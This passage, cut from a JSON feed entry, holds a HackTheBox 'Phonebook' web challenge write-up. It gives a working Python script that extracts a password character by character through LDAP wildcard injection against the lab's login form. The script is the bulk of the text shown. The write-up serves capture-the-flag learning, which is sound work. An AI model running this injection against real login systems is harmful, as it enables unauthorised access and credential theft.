ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj\" data-selectable-paragraph=\"\">This gives us a hint that it is probably using <a class=\"af rn\" href=\"https://searchmobilecomputing.techtarget.com/definition/LDAP\" rel=\"noopener ugc nofollow\" target=\"_blank\">LDAP</a> authentication.</p>\n</blockquote>\n<p id=\"23b0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we are going to try character brute-force (LDAP Injection) using Python script.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"cdc9\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> string<br><br>headers = {<span class=\"hljs-string\">\"UserAgent\"</span> : <span class=\"hljs-string\">\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\"</span>}<br>url = <span class=\"hljs-string\">\"http://167.99.84.37:32125/login\"</span><br><br>chars = string.ascii_letters<br>chars += <span class=\"hljs-string\">''</span>.join([<span class=\"hljs-string\">'0'</span>, <span class=\"hljs-string\">'1'</span>, <span class=\"hljs-string\">'2'</span>, <span class=\"hljs-string\">'3'</span>, <span class=\"hljs-string\">'4'</span>, <span class=\"hljs-string\">'5'</span>, <span class=\"hljs-string\">'6'</span>, <span class=\"hljs-string\">'7'</span>, <span class=\"hljs-string\">'8'</span>, <span class=\"hljs-string\">'9'</span>, <span class=\"hljs-string\">'`'</span>, <span class=\"hljs-string\">'~'</span>, <span class=\"hljs-string\">'!'</span>, <span class=\"hljs-string\">'@'</span>, <span class=\"hljs-string\">'$'</span>, <span class=\"hljs-string\">'%'</span>, <span class=\"hljs-string\">'&amp;'</span>, <span class=\"hljs-string\">'-'</span>, <span class=\"hljs-string\">'_'</span>, <span class=\"hljs-string\">\"'\"</span>])<br><br>counter = <span class=\"hljs-number\">0</span><br>flag = <span class=\"hljs-string\">\"HTB{\"</span><br><br><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">True</span>:<br>    <span class=\"hljs-comment\"># if all chars are not correct means we previous already found the flag</span><br>    <span class=\"hljs-keyword\">if</span> counter == <span class=\"hljs-built_in\">len</span>(chars):<br>        <span class=\"hljs-built_in\">print</span>(flag + <span class=\"hljs-string\">\"}\"</span>)<br>        <span class=\"hljs-keyword\">break</span><br><br>    <span class=\"hljs-comment\"># creates something like HTB{a*}</span><br>    password = flag + chars[counter] + <span class=\"hljs-string\">\"*}\"</span><br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Trying: \"</span> + password)<br><br>    data = {<span class=\"hljs-string\">\"username\"</span> : <span class=\"hljs-string\">\"Reese\"</span>, <span class=\"hljs-string\">\"password\"</span> : password}<br>    response = requests.post(url, headers=headers, data=data)<br>    <br>    <span class=\"hljs-keyword\">if</span> (response.url != url + <span class=\"hljs-string\">\"?message=Authentication%20failed\"</span>):<br>        <span class=\"hljs-comment\"># possible flag since we still using * at the end: e.g HTB{abc_*}.</span><br>        <span class=\"hljs-comment\"># append chars[] so that we not need to deal with removing \"*}\" as compared to if we assign password variable to flag variable</span><br>        flag += chars[counter]<br>        counter = <span class=\"hljs-number\">0</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-comment\"># increment the char since we might not have found the right letter</span><br>        counter += <span class=\"hljs-number\">1</span></span></pre>\n<p id=\"9132\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Once we iterated all the letters and the result still fails, it means that the latest password/flag entered <strong class=\"ly kz\">without </strong>the asterisk (*) is the flag.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*SqUTjKBmeNorLcV9O6Llmw.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"382\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"4f95\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Hurrah!!! we got the flag that we are seeking :))</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/8/Phonebook-HTB-Web-Challenge-Writeup1.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "HackTheBox",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:49:22+06:00",
            "date_modified": "2024-01-29T16:56:52+06:00"
        }
    ]
}
